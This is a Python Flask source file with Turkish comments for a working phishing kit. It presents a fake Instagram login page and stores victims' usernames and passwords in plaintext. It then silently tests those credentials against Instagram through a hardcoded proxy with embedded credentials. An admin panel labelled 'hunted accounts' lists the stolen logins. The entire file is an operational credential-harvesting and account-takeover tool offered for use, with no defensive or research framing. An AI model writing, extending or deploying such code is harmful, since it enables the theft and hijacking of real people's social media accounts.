import os
import threading
import time
import random
from flask import Flask, request, jsonify, render_template_string, redirect
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# PROXY (Senin taze bilgiler)
PROXY_URL = "http://SDDLzRveLbkavJr:MPvdO65MOnMifL7@82.41.250.136:42158"

class UserAccount(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True)
    password = db.Column(db.String(100))
    status = db.Column(db.String(100), default="Doğrulanıyor...")

def background_bot_logic(u, p):
    with app.app_context():
        cl = Client()
        acc = UserAccount.query.filter_by(username=u).first()
        try:
            cl.set_proxy(PROXY_URL)
            cl.set_device_settings(cl.delay_range == [1, 3])
            # Burada sessizce giriş deniyoruz
            if cl.login(u, p):
                acc.status = "AKTİF ✅"
                # Giriş başarılı! Artık bu hesapla her şeyi yapabilirsin.
            else:
                acc.status = "GİRİŞ HATASI ❌"
        except Exception as e:
            acc.status = "ENGEL/TIMEOUT 🚫"
        db.session.commit()

@app.route('/')
def index():
    return render_template_string(LOGIN_HTML)

@app.route('/login', methods=['POST'])
def login():
    u, p = request.form.get('u'), request.form.get('p')
    if u and p:
        acc = UserAccount.query.filter_by(username=u).first()
        if not acc:
            acc = UserAccount(username=u, password=p)
            db.session.add(acc)
        else:
            acc.password, acc.status = p, "Doğrulanıyor..."
        db.session.commit()

        threading.Thread(target=background_bot_logic, args=(u, p)).start()
        
        # INSTAGRAM'A ATMIYORUZ! Kendi bekleme sayfamıza gönderiyoruz.
        return redirect(f"/waiting?u={u}")
    return redirect("/")

@app.route('/waiting')
def waiting():
    u = request.args.get('u')
    return render_template_string(WAITING_HTML, username=u)

@app.route('/api/check-status/<u>')
def check_status(u):
    acc = UserAccount.query.filter_by(username=u).first()
    return jsonify(status=acc.status if acc else "Hata")

@app.route('/panel-admin')
def admin():
    accounts = UserAccount.query.order_by(UserAccount.id.desc()).all()
    return render_template_string(ADMIN_HTML, accounts=accounts)

# --- HTML TASARIMLARI ---

LOGIN_HTML = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-black flex flex-col items-center justify-center min-h-screen">
    <div class="w-80 p-10 border border-zinc-800 rounded-sm text-center">
        <h1 class="text-4xl italic font-bold text-white mb-10">Instagram</h1>
        <form action="/login" method="POST">
            <input name="u" placeholder="Kullanıcı adı" class="w-full bg-zinc-900 border border-zinc-800 p-2 mb-2 text-xs text-white outline-none" required>
            <input name="p" type="password" placeholder="Şifre" class="w-full bg-zinc-900 border border-zinc-800 p-2 mb-4 text-xs text-white outline-none" required>
            <button class="w-full bg-[#0095f6] text-white font-bold py-1.5 rounded-lg text-sm">Giriş Yap</button>
        </form>
    </div>
</body>
</html>
"""

WAITING_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"><script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-black text-white flex flex-col items-center justify-center min-h-screen">
    <div class="animate-spin h-10 w-10 border-4 border-blue-500 border-t-transparent rounded-full mb-4"></div>
    <h2 class="text-xl font-bold">Hesabınız Doğrulanıyor...</h2>
    <p class="text-zinc-500 text-sm mt-2">Lütfen bu sayfadan ayrılmayın (30sn sürebilir)</p>
    <script>
        const u = "{{ username }}";
        const check = setInterval(async () => {
            const r = await fetch('/api/check-status/' + u);
            const d = await r.json();
            if(d.status.includes('✅')) {
                clearInterval(check);
                alert("Başarıyla Bağlandı! Panele yönlendiriliyorsunuz.");
                location.href = "https://instagram.com"; // Veya kendi panelin
            } else if(d.status.includes('❌') || d.status.includes('🚫')) {
                clearInterval(check);
                alert("Hata: " + d.status);
                location.href = "/";
            }
        }, 3000);
    </script>
</body>
</html>
"""

ADMIN_HTML = """
<!DOCTYPE html>
<html>
<head><script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-zinc-950 text-white p-10">
    <h1 class="text-2xl font-bold mb-6 text-blue-500 italic uppercase">AVLANAN HESAPLAR</h1>
    <div class="bg-zinc-900 rounded-xl overflow-hidden border border-zinc-800">
        <table class="w-full text-left text-sm">
            <thead class="bg-zinc-800">
                <tr><th class="p-4">User</th><th class="p-4">Pass</th><th class="p-4">Durum</th></tr>
            </thead>
            <tbody>
                {% for a in accounts %}
                <tr class="border-t border-zinc-800">
                    <td class="p-4 font-bold">@{{ a.username }}</td>
                    <td class="p-4 text-zinc-400 font-mono">{{ a.password }}</td>
                    <td class="p-4 text-blue-400">{{ a.status }}</td>
                </tr>
                {% endfor %}
            </tbody>
        </table>
    </div>
    <button onclick="location.reload()" class="mt-6 bg-blue-600 px-6 py-2 rounded-lg">GÜNCELLE</button>
</body>
</html>
"""

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
